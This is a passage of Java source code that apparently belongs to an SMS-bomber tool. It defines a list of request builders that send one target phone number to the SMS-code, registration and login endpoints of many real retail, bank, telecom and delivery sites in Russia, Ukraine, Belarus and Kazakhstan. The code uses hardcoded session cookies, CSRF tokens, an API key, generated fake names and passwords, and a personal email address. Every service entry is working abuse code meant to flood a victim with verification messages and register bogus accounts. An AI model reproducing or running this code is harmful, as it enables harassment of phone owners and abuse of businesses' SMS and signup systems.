geo_detect=%D0%9A%D0%B0%D0%B7%D0%B0%D0%BD%D1%8C%2C%D0%A0%D0%B5%D1%81%D0%BF%D1%83%D0%B1%D0%BB%D0%B8%D0%BA%D0%B0%20%D0%A2%D0%B0%D1%82%D0%B0%D1%80%D1%81%D1%82%D0%B0%D0%BD%2C%D0%9F%D1%80%D0%B8%D0%B2%D0%BE%D0%BB%D0%B6%D1%81%D0%BA%D0%B8%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; _gat=1; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2Fretail%2Fcards%2Fdebit%2Fcashback-card%2F%23ccform-form");
                        request.header("DNT", "1");
                        request.header("Host", "oapi.raiffeisen.ru");
                        request.header("Origin", "https://www.raiffeisen.ru");
                        request.header("Referer", "https://www.raiffeisen.ru/retail/cards/debit/cashback-card/");
                        request.header("Sec-Fetch-Dest", "empty");
                        request.header("Sec-Fetch-Mode", "cors");
                        request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                        request.header("sec-ch-ua-mobile", "?0");
                        request.header("sec-ch-ua-platform", "\"Windows\"");
                        request.header("Sec-Fetch-Site", "same-site");

                        try {
                            return new JSONObject()
                                    .put("number", phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://vkusvill.ru/ajax/user_v2/auth/check_phone.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "PHPSESSID=JFDE2S1WINIRUlqa6WMH4wIGsbN4V6ui; BITRIX_SM_REGION_ID_3=3872; SERVERID=bitrix01; _vv_card=A402373; _gcl_au=1.1.1619096383.1661248403; _ym_uid=1661248404718516519; _ym_d=1661248404; tmr_lvid=4b0376f50a09ccffe9ca93755ced8567; tmr_lvidTS=1661248403869; _ga=GA1.2.395200366.1661248404; _gid=GA1.2.1193627669.1661248404; _gat_gtag_UA_138047372_1=1; _ym_isad=2; mgo_sb_migrations=1418474375998%253D1; mgo_sb_current=typ%253Dorganic%257C%252A%257Csrc%253Dgoogle%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_first=typ%253Dorganic%257C%252A%257Csrc%253Dgoogle%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_session=pgs%253D2%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fvkusvill.ru%252F; mgo_uid=FHHjvoNFQne7JHtHv2Uo; mgo_cnt=1; mgo_sid=pk4lrh2bh011001q8wnp; _dc_gtm_UA-138047372-1=1; uxs_uid=6d9a40f0-22c9-11ed-a82b-25c841ac1c5b; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; tmr_detect=0%7C1661248406244; WE_USE_COOKIE=Y; tmr_reqNum=8");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.add("FUSER_ID", "207529943");
                        builder.add("USER_NAME", "");
                        builder.add("USER_PHONE", Phone.format(phone.getPhone(), "+7 (***) ***-****"));
                        builder.add("token", "");
                        builder.add("is_retry", "");
                        builder.add("AGREE_SUBSCRIBE", "Y");
                    }
                },

                new FormService("https://www.liqpay.ua/apiweb/login/start", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "_gcl_au=1.1.2000038126.1661250974; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-08-23%2013%3A36%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fauthorization%3Freturn_to%3D%252Fuk%252Fadminbusiness%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-08-23%2013%3A36%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fauthorization%3Freturn_to%3D%252Fuk%252Fadminbusiness%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F104.0.5112.102%20Safari%2F537.36%20Edg%2F104.0.1293.63; _ga_SC8SJ5GD85=GS1.1.1661250974.1.0.1661250974.0.0.0; _fbp=fb.1.1661250974723.798111670; _ga=GA1.2.804869749.1661250975; _gid=GA1.2.1515868995.1661250975; _dc_gtm_UA-213775397-1=1; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fuk%2Flogin%2Flogin%2F1661250975005613_69027_PhMFILQwTvgiZrnm8B7X; _dc_gtm_UA-48226031-1=1");
                        request.header("-requested-with", "XMLHttpRequest");

                        builder.add("token", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X");
                        builder.add("phone", phone.toString());
                        builder.add("pagetoken", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X");
                        builder.add("checkouttoken", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X");
                        builder.add("language", "uk");
                    }
                },

                new FormService("https://aptechestvo.ru/ajax/new_app/sms/send_sms_code.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("phone", Phone.format(phone.getPhone(), "+7(***) ***-**-**"));
                    }
                },

                new JsonService("https://green-dostavka.by/api/v1/auth/request-confirm-code/", 375) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "tmr_lvid=0967463045c6bc62af3d493d4e61a7f6; tmr_lvidTS=1664384202297; _ga=GA1.2.618762003.1664384202; _gid=GA1.2.2070330642.1664384203; _dc_gtm_UA-175994570-1=1; _gat_UA-231562053-1=1; _ym_uid=1664384203181017640; _ym_d=1664384203; _ym_isad=2; _ym_visorc=w; _ga_0KMPZ479SN=GS1.1.1664384202.1.1.1664384204.58.0.0; tmr_detect=0|1664384205010; tmr_reqNum=6");

                        try {
                            return new JSONObject()
                                    .put("phoneNumber", Phone.format(phone.getPhone(), "+375 ** *** ** **"))
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new JsonService("https://sosedi.by/local/api/smsSend.php", 375) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "_gcl_au=1.1.440078486.1664384002; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _ym_uid=1664384005288308463; _ym_d=1664384005; _ga=GA1.2.1716162404.1664384005; _gid=GA1.2.256273649.1664384005; tmr_lvid=6015526cad4b89db479519786a667a37; tmr_lvidTS=1664384004982; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; PHPSESSID=zlqD9vpWcOSVOhtY5iv9rjySBYog0QQk; _gat_gtag_UA_34496864_1=1; _ym_visorc=w; _ym_isad=2; tmr_detect=0|1664468829484; tmr_reqNum=12; cookiepolicyaccept=true");

                        try {
                            return new JSONObject()
                                    .put("phone", Phone.format(phone.getPhone(), "+375 (**) *******"))
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://www.respect-shoes.kz/send_sms", 77) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("_token", "K0uMK3EpgqiMLt1pXeqsPoQxtnPZBWen98Sm41bH");
                        builder.add("tel", Phone.format(phone.getPhone(), "+7 (7**) ***-**-**"));

                        request.header("cookie", "_gcl_au=1.1.1523339745.1664471567; tmr_lvid=5cfff78042fa8318f8edede4e2f1780d; tmr_lvidTS=1659695387764; _gid=GA1.2.759847769.1664471567; _ym_uid=1659695389109290314; _ym_d=1664471567; roistat_visit=1941526; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; _ym_visorc=w; _ym_isad=2; _tt_enable_cookie=1; _ttp=3fc27b9b-4797-4657-8bc9-b00a346625d6; ___dc=61a72ed9-acc4-44f9-ac7d-1fd9e1ea2ae8; Cookie_id=eyJpdiI6Imdpc216aGlUT1cwS1BaVVwvSXQ1OGZnPT0iLCJ2YWx1ZSI6IlpFMlJKWEFzOVwvbEVWejRYTm11d1JXZ2VQVTZZNk5kUjhSXC83R2tEMkpHMU52bDdXY1cxdVZrZ3JuWitMa0M5ciIsIm1hYyI6IjAzMTAwOTE1M2JiODZiZmU5YzJkZTkyNTVhOGRkODcxMzI1MDlhNDYyOGU3YzQ0YTIyNGUzOTBmMmViOTkyODgifQ==; siti_id=eyJpdiI6IlY1Vk1vTFBpUlwvRkp0c252QkFVMklnPT0iLCJ2YWx1ZSI6IkdkSnl0elk2NGF5SmNWWjhPdWxyZHc9PSIsIm1hYyI6Ijg2Y2E2NDhkZThlMDMzZDRmNzBhNDk2Mzg5YTk3OTkyNTZiNmNmOTAwZTc3MjZlZGIwODgwNjgwN2QwNmRiMjQifQ==; sitiset=eyJpdiI6InlWaUxXQjcxcGpPWUQrV3dBeXpWXC9nPT0iLCJ2YWx1ZSI6IkZiVXZmM2NGR0N0TUVMT2hyRWdZT2c9PSIsIm1hYyI6IjMyODM2YmRiMThlYzRmZDhhNjdkZGYxOTE2M2I3ZTIwNmQ2ZWZhOWQxOTQ1ZGZiMWRlODAzZDU3NjA2ZjAwYzcifQ==; roistat_call_tracking=1; roistat_emailtracking_email=null; roistat_emailtracking_tracking_email=null; roistat_emailtracking_emails=null; roistat_cookies_to_resave=roistat_ab,roistat_ab_submit,roistat_visit,roistat_call_tracking,roistat_emailtracking_email,roistat_emailtracking_tracking_email,roistat_emailtracking_emails; _ga=GA1.2.111816835.1664471567; tmr_detect=0|1664471755330; tmr_reqNum=14; 499818=eyJpdiI6InNxWkp6M05Tajl4SlZXb2t5R1wvNFVnPT0iLCJ2YWx1ZSI6Im0xb3poMUJHclpSZFA3TnhqWXp3RVlrRFwvSUNBaVNRdXRPRmtjWGJ0M3Y2RzUrM052OG9YWE9yMnFMVExyK2cwWUNzOHFtb1wvd0E3c0JFemNmc0J1Rmc9PSIsIm1hYyI6IjRkMTdkZDVjZjY1ZmFjNWE0OWJjNGNiOGEwMGNiM2UyMzY1ZDQ2ZjIxM2Y4NTQ1NmVkYmMwNDQ2NTQ4ZmM3MjIifQ==; _ga_NFEYSRQ86N=GS1.1.1664471566.1.1.1664471942.0.0.0; XSRF-TOKEN=eyJpdiI6Ikt3MjZrY0NPQkpSZlNkY0J1ckpuSGc9PSIsInZhbHVlIjoia1BGNTFITnB3Z3ZlaFYrMzhoZWlIVmp6dHFcL0JvSjZST280bnJpRm9XejdBa2d6cjByODN3RTdoZE9NdG84blciLCJtYWMiOiIwMmE0OTkxNGRjMzc4OWYxZWIzMmNlNzRkYWMzZDVhNjI4ZDQ1NmVmMmRjN2Y5MTU1NzRiNGFkMzliODBmNDlmIn0=; laravel_session=eyJpdiI6IlwvRGpJdkVIY3RHdTlhRDRINWt6czRnPT0iLCJ2YWx1ZSI6ImFhaFVOWXpXdGRVVE1vWjRQXC9PNEQwaWEwaXFQaGNCZUhyemVncWp5YlI4VERxeFwvY3RicDFMWW9vNDVWcmFrZiIsIm1hYyI6IjA1MmNlNzM1NzNhNzc2OTg2MGFiMDQzZTY2ZmMxOGIyOTlhNzFiNTkwNjU3NDYyYzQ3MTYyMjkyODdlMTM2NzkifQ==; 768131=eyJpdiI6IkQ0cGlZcVUzNXNxUXNPaTNjNEcwRnc9PSIsInZhbHVlIjoiUk5URkR1Y05Vclc1Y01qbE5aUzJCZkdtMmp1Qll5WlNNeXNpeDV2MzVDYmtUcUZrT1wvcUVlaU1ianQraU41RTU1NWVEZVNGMkNCaVZuREN6U2ppV29BPT0iLCJtYWMiOiJkOThjNGE5ZTQwNGQxNjAwMWI0YmI2NmRiZjk1OTExNTNhOWI4YzcwNGE0N2IzNDcyNDRmNzBhMmIyNmFmYTM5In0=; tel=eyJpdiI6IlhLa2ExTVJsc3plZ1c4cEFiRGFIM1E9PSIsInZhbHVlIjoiZDB2MFpiMERqZTMxTzdBUkRVb0dSUT09IiwibWFjIjoiMjliZDdiZWQxYzNiYzkwZTM2MjJjNGNiY2ZmODY5MzQxYzE0MWEzODgzYWYyNTM5Mzg5YjYxNzJkMmQ4MzU1YSJ9");
                        request.header("X-Requested-With", "XMLHttpRequest");
                    }
                },

                new FormService("https://id.kolesa.kz/getInfoAuth.json", 77) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("project", "market");
                        builder.add("login", "+" + phone.toString());
                        builder.add("csrf", "czhDbUhLR1E5YUh1dHllZ0ZOdlU0UT09");
                        builder.add("restore", "0");
                        builder.add("iteration", "primary");

                        request.header("cookie", "ccid=vur2iajjpti6u660kdkii4mlgd; ssaid=e020e420-401b-11ed-b971-fb3d2d634bd2; __tld__=null");
                        request.header("X-Requested-With", "XMLHttpRequest");
                    }
                },

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        String formattedPhone = Phone.format(phone.getPhone(), "+7 (***) ***-**-**");

                        client.newCall(new Request.Builder()
                                .url("https://babylonvape.ru/auth/registration/?register=yes&backurl=%2Fauth%2F")
                                .header("upgrade-insecure-requests", "1")
                                .header("referer", "https://babylonvape.ru/auth/registration/?register=yes&backurl=/auth/")
                                .header("cookie", "PHPSESSID=9D26aEZS5EpjZlhsd1Y1NYWyAufAzpwp; BITRIX_SM_SALE_UID=c29417494cd049f7c5fcf28051ace9d2; rrpvid=780283164294524; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":5,\"EXPIRE\":1664657940,\"UNIQUE\":[\"conversion_visit_day\"]}; _ym_debug=null; _ym_uid=1654436025122788696; _ym_d=1664632221; rcuid=6275fcd65368be000135cd22; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_isad=2; _ym_visorc=w; _ga=GA1.2.877344353.1664632222; _gid=GA1.2.958698788.1664632222; rrwpswu=true; babylon_confirm_age=Y; _gat_gtag_UA_56968396_1=1")
                                .post(RequestBody.create("------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"backurl\"\n" +
                                                "\n" +
                                                "/auth/\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"register_submit_button\"\n" +
                                                "\n" +
                                                "reg\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[LOGIN]\"\n" +
                                                "\n" +
                                                "1\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[LAST_NAME]\"\n" +
                                                "\n" +
                                                "\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[NAME]\"\n" +
                                                "\n" +
                                                "\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[SECOND_NAME]\"\n" +
                                                "\n" +
                                                "\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[EMAIL]\"\n" +
                                                "\n" +
                                                getEmail() +
                                                "\n------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[PERSONAL_PHONE]\"\n" +
                                                "\n" +
                                                formattedPhone +
                                                "\n------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[PASSWORD]\"\n" +
                                                "\n" +
                                                "qwerty\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[CONFIRM_PASSWORD]\"\n" +
                                                "\n" +
                                                "qwerty\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"licenses_register\"\n" +
                                                "\n" +
                                                "Y\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[PHONE_NUMBER]\"\n" +
                                                "\n" +
                                                formattedPhone +
                                                "\n------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[PHONE_NUMBER]\"\n" +
                                                "\n" +
                                                formattedPhone +
                                                "\n------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"register_submit_button1\"\n" +
                                                "\n" +
                                                "Регистрация\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr--",
                                        MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryZKfaTYUmRp781EJr")))
                                .build()).enqueue(callback);
                    }
                },

                new FormService("https://www.moyo.ua/identity/registration", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("x-requested-with", "XMLHttpRequest");
                        request.header("cookie", "YII_CSRF_TOKEN=b5600a221539c29fd3628b4d0e682b65e8e51355; _hjSessionUser_1850514=eyJpZCI6ImY3MWQ2M2NhLTFmNjUtNTY5MC1hMDE4LTZjMzc1ZTM3NDk3MCIsImNyZWF0ZWQiOjE2NjUxNTMwMDY2NTEsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_1850514=eyJpZCI6IjgwZmI0YzgwLWI0YWUtNDgxNC04NGE2LTk0YmVkODQ0NjM0ZiIsImNyZWF0ZWQiOjE2NjUxNTMwMDg2MzYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; new_user_ga=1; no_detected_user_ga=0; PHPSESSID=fdeiilohmvd7o6t1lm1ghhmm66; g_state={\"i_p\":1665160212060,\"i_l\":1}");

                        builder.add("firstname", getRussianName());
                        builder.add("phone", Phone.format(phone.getPhone(), "+380(**)***-**-**"));
                        builder.add("email", getEmail());
                    }
                },

                new FormService("https://sohorooms.ua/index.php?route=account/register/sms", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "PHPSESSID=6d0d51e8f0da1fe803f36f1c2f53dd01; language=ru; currency=UAH; screen=1536x864; nav=5.0 (Windows NT 10.0; tzo=-180; cd=24; language=ru; referer=sohorooms.ua; referer_marker=1; _gcl_au=1.1.1518637680.1665305924; _gid=GA1.2.1889716149.1665305924; _gat=1; _fbp=fb.1.1665305924935.1029977243; _ga_KFE70ENL3B=GS1.1.1665305924.1.1.1665305926.58.0.0; _ga=GA1.2.1706081357.1665305924; _hjSessionUser_2799148=eyJpZCI6ImQxNmFmZmYyLTJhOWMtNTMxMC1hMTZjLTU2Y2EyMTEwMWJkMiIsImNyZWF0ZWQiOjE2NjUzMDU5MjY3NDMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2799148=eyJpZCI6IjNkMGVmYmViLTlmYjctNDE0Yy04NTY4LTU1YzUxOGU4MDYzOSIsImNyZWF0ZWQiOjE2NjUzMDU5MjY3NjksImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0; googtrans=/ru/uk; googtrans=/ru/uk");

                        builder.add("telephone", Phone.format(phone.getPhone(), "+38 (***) ***-**-**"));
                    }
                },

                new JsonService("https://api.myacuvuepro.ru/myacuvue/oauth/mobile") {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("x-api-key", "XoA3wMy3d8LNGDToaWz1yQdjRiKcjLWu");
                        request.header("x-app-version", "PWA 2.3.0");

                        try {
                            return new JSONObject()
                                    .put("phoneNumber", phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        String password = getEmail();

                        client.newCall(new Request.Builder()
                                .url("https://www.podrygka.ru/ajax/phone_confirm_code_validate.php")
                                .header("Cookie", "flocktory-uuid=fa9d7b5f-e63e-41ac-8b22-ca3d9cb43072-4; rrpvid=170226106135378; _gcl_au=1.1.1659345411.1665500180; rcuid=6275fcd65368be000135cd22; tmr_lvid=2dbe4e6285f3faa81cefd4b8f8722148; tmr_lvidTS=1665500200389; _gid=GA1.2.36819294.1665500201; _gaexp=GAX1.2.Vinba-iySqGfm4hVoZTHNg.19307.1; _ym_uid=1665500201989305824; _ym_d=1665500201; _ym_visorc=b; _userGUID=0:l94btgzf:8kxn3GOGsBMPYhUZsp9uMhA~IbOYNHP4; dSesn=a770fd10-00e7-53fb-6a46-2134675b5f0f; _dvs=0:l94btgzf:oWakvuAIPIustCKMEotfMlw8A5hyQW7C; BITRIX_SM_SALE_UID=911659922; PHPSESSID=fd931c99d850fa105bcb70c13ac96a95; tmr_detect=0|1665500362277; _ga_49YR0G3D1G=GS1.1.1665500200.1.1.1665500437.60.0.0; _ga_PNTGGG08RK=GS1.1.1665500200.1.1.1665500437.60.0.0; _ym_isad=2; _tt_enable_cookie=1; _ttp=39ad416f-d074-4b3b-88d0-74d3528eb8cc; uxs_uid=7896bf60-4975-11ed-9330-ad6a983eb59f; _ga=GA1.2.1755673402.1665500200; _gat_UA-46690290-1=1; tmr_reqNum=12")
                                .header("x-requested-with", "XMLHttpRequest")
                                .post(RequestBody.create("------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"redirectURL\"\n" +
                                                "\n" +
                                                "\n" +
                                                "------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"repeat_password\"\n" +
                                                "\n" +
                                                password +
                                                "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"sessid\"\n" +
                                                "\n" +
                                                "565e6d624ef833230324400a275412e0\n" +
                                                "------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"first_name\"\n" +
                                                "\n" +
                                                getRussianName() +
                                                "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"last_name\"\n" +
                                                "\n" +
                                                getRussianName() +
                                                "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"email\"\n" +
                                                "\n" +
                                                getEmail() +
                                                "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"phone\"\n" +
                                                "\n" +
                                                Phone.format(phone.getPhone(), "+7 ( *** ) *** ** **") +
                                                "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"password\"\n" +
                                                "\n" +
                                                password +
                                                "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"agree_personal\"\n" +
                                                "\n" +
                                                "Y\n" +
                                                "------WebKitFormBoundary8VnGsAfzm5mtbFjn--",
                                        MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundary8VnGsAfzm5mtbFjn")))
                                .build()).enqueue(callback);
                    }
                },

                new JsonService("https://bi.ua/api/v1/accounts", 380) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "advanced-frontend=m175oep0fvf67qpl3epn8sp60u; _csrf-frontend=88e5d09991180d498981d8431cf84d8db27f5f1f126057fbcc3150fb8b2b14d6a:2:{i:0;s:14:\"_csrf-frontend\";i:1;s:32:\"zYPJtL4SUUfp6FnPeozLAPWWl1RHVXWg\";}; _gcl_au=1.1.220301665.1666887102; sbjs_migrations=1418474375998=1; sbjs_current_add=fd=2022-10-27 19:11:41|||ep=https://bi.ua/|||rf=(none); sbjs_first_add=fd=2022-10-27 19:11:41|||ep=https://bi.ua/|||rf=(none); sbjs_current=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); sbjs_first=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); _gid=GA1.2.53598285.1666887102; _hjFirstSeen=1; _hjSession_1559188=eyJpZCI6IjdmZjk4ZjUxLThjZGEtNGYzMy05ZTczLWUxNzcyNDA1MmUyMSIsImNyZWF0ZWQiOjE2NjY4ODcxMDMzNzIsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; _fbp=fb.1.1666887103435.206244386; _p_uid=uid-2e5d5cf42.484adb2db.3d26406f7; _hjSessionUser_1559188=eyJpZCI6IjQ3ZDlkZDBiLTQ4ZDItNTdhOC05YjkyLTA3YjI2MGM2NDZjOSIsImNyZWF0ZWQiOjE2NjY4ODcxMDMzMTksImV4aXN0aW5nIjp0cnVlfQ==; _hjIncludedInSessionSample=0; sbjs_udata=vst=2|||uip=(none)|||uag=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52; sbjs_session=pgs=1|||cpg=https://bi.ua/ukr/signup/; _dc_gtm_UA-8203486-4=1; _ga_71EP10GZSQ=GS1.1.1666889396.2.1.1666889403.53.0.0; _ga=GA1.1.228057617.1666887102; _gali=emailPhone");
                        request.header("language", "uk");

                        try {
                            return new JSONObject()
                                    .put("grand_type", "call_code")
                                    .put("login", getRussianName())
                                    .put("phone", phone.toString())
                                    .put("stage", "1")
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new JsonService("https://registration.vodafone.ua/api/v1/process/smsCode", 380) {
                    @Override
                    public String buildJson(Phone phone) {
                        try {
                            return new JSONObject()
                                    .put("number", phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new JsonService("https://megasport.ua/api/auth/phone/?language=ua", 380) {
                    @Override
                    public String buildJson(Phone phone) {
                        try {
                            return new JSONObject()
                                    .put("phone", "+" + phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new JsonService("https://lc.rt.ru/backend/api/lk/user", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "9f4f336f6f7d6675fa0f0e9148c541ed=d6acbdd529a9190f323b42f389c69cbc; 3ab55dd37f775ece19b2e3ceee2c84f5=a5b234824bc53bee9a3e12d3c3df7a96; _ym_uid=1666890907592977795; _ym_d=1666890907; amplitude_id_203a27827b8ff81b5b583aa58b07799brt.ru=eyJkZXZpY2VJZCI6IjI3MTU3YWJkLWMxOTgtNDU1Ni05ZThiLTVkMTRiMTViOTNiYVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTY2Njg5MDkwNjkyNywibGFzdEV2ZW50VGltZSI6MTY2Njg5MDkwNjkyNywiZXZlbnRJZCI6MCwiaWRlbnRpZnlJZCI6MCwic2VxdWVuY2VOdW1iZXIiOjB9; _ym_visorc=w; ahoy_visitor=f84331f8-a3d6-4ca9-bd4b-fbb313b7b07a; ahoy_visit=5c322d7d-24e3-4716-9cee-61763f8ece19; _ym_isad=2; _a_d3t6sf=duMvII_RZFH2V0RbH3OHtSJP; _edtech_session=yVwf56MV9mW+fMURg6WTDi9KlKTWuiwxtyJNdaMixpDqGZR9QzCDYuB3tScZ+ZIRXhVNjUy/EI2As6rMgj/qWhXM8ZC7xXo=--pz5saz3tM1rt/Axo--AqlZIt6hBq68BAEuztHwEA==; TS01f13338=0194c94451ad1f787e1ee5e671fda0c838612d15f13c1258e0c407d9871c53096381b029b87318c8a07e108f1092a9b783fdd2c2c90a0efa6c7c46a98db95cdb29c39619d2a6203a2d5cb43cbaa53528a7c61d7d5a7489eb1dc4028e48c65fcf514d7a6a2c79f325038c97ad39086d017e5f9358f6");

                        try {
                            return new JSONObject()
                                    .put("email", "dmitrijkotov634@gmail.com")
                                    .put("first_name", getRussianName())
                                    .put("grade_tag", "1 класс")
                                    .put("last_name", getRussianName())
                                    .put("password", "123456789qwertyQWERTY_")
                                    .put("password_confirmation", "123456789qwertyQWERTY_")
                                    .put("phone", phone.getPhone())
                                    .put("region_id", "77")
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://ilmolino.ua/api/v1/user/auth", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "dae23e1f6b5bf8609e2224d695520311=uk-UA; _ga=GA1.2.1143011635.1665315863; 5c56ddacb7d52afbab2130776ac59994=t3ur4081qmdghtv0p3qvr12m5f; _fbp=fb.1.1666892652193.1052781207; _gid=GA1.2.1914159569.1666892656; _gat_gtag_UA_200520041_1=1");

                        builder.add("phone", "0" + phone.getPhone());
                        builder.add("need_skeep", "");
                    }
                },

